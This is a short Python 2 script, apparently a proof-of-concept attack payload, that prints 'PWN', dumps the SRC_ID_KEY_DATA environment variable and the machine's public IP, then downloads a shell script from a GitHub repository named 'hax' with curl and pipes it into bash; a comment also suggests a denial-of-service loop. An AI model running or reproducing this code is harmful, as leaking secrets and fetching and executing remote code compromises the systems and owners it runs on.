import sys, os

print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~"

print "SRC_ID_KEY_DATA:", os.environ['SRC_ID_KEY_DATA']

print "Querying public IP..."
import urllib2
print urllib2.urlopen("https://api.ipify.org/?format=json").read()

# Feeling mean? Try DOS:
# while True:
#     1+1

print "Executing payload..."
import os
os.system("which curl")
os.system("curl -sSL https://raw.githubusercontent.com/pararthshah/hax/master/payload.sh | bash")

print "Done."
sys.exit(0);

